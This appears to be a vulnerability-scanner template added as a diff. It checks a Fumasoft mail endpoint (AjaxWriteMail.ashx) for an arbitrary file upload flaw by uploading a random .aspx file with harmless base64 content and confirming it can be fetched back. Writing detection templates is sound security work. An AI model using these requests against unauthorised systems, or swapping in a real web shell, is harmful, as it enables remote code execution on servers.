@@ -1,0 +1,52 @@
+id: poc-yaml-fumasoft-ajaxwritemail-ashx-anyfile-upload
+info:
+  name: Fumasoft AjaxWriteMail.ashx Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_text_alphanumeric(7)}}'
+  t2: '{{base64(t1)}}'
+  dt: '{{date_time("2006-01-02")}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - '{{BaseURL}}/m/Dingding/Ajax/AjaxWriteMail.ashx?method=UpLoadAttachment'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+    body: |-
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".aspx"
+        part: body
+
+  - id: file-access
+    method: GET
+    path:
+      - '{{BaseURL}}/m/Dingding/images/dingDingWorkFlow/{{dt}}/{{t1}}.aspx'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
+        part: body
